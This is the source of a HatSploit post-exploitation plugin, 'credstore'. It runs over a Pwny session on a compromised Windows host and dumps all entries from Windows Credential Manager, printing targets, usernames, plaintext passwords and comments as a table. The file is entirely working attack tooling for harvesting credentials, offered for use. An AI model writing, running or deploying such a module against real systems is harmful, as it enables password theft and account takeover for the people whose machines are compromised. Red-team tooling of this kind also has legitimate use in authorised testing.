"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin


CREDSTORE_LIST = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)

TLV_TYPE_CRED_TARGET = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
TLV_TYPE_CRED_USER = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
TLV_TYPE_CRED_PASS = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)
TLV_TYPE_CRED_COMMENT = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 3)
TLV_TYPE_CRED_TYPE = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE)
TLV_TYPE_CRED_GROUP = tlv_custom_type(TLV_TYPE_GROUP, TAB_BASE, API_TYPE)

CRED_TYPE_NAMES = {
    1: "Generic",
    2: "Domain",
    3: "Certificate",
    4: "Visible",
}


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Credential Store Plugin",
            'Plugin': "credstore",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Enumerate Windows Credential Manager.",
        })

        self.commands = [
            Command({
                'Category': "gather",
                'Name': "credstore",
                'Description': "Enumerate Windows Credential Manager.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-l', '--list'),
                        {
                            'help': "List all stored credentials.",
                            'action': 'store_true',
                        }
                    ),
                ]
            })
        ]

    def credstore(self, args):
        if args.list:
            result = self.session.send_command(
                tag=CREDSTORE_LIST,
                plugin=self.plugin,
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to enumerate credentials!")
                return

            headers = ('Target', 'Type', 'Username', 'Password', 'Comment')
            data = []

            while True:
                entry = result.get_tlv(TLV_TYPE_CRED_GROUP)
                if entry is None:
                    break

                target = entry.get_string(TLV_TYPE_CRED_TARGET) or ''
                user = entry.get_string(TLV_TYPE_CRED_USER) or ''
                password = entry.get_string(TLV_TYPE_CRED_PASS) or ''
                comment = entry.get_string(TLV_TYPE_CRED_COMMENT) or ''
                cred_type = entry.get_int(TLV_TYPE_CRED_TYPE) or 0

                type_name = CRED_TYPE_NAMES.get(cred_type, 'Unknown')
                data.append((target, type_name, user, password, comment))

            if not data:
                self.print_warning("No credentials found.")
                return

            self.print_table("Credentials", headers, *data)

    def load(self):
        pass
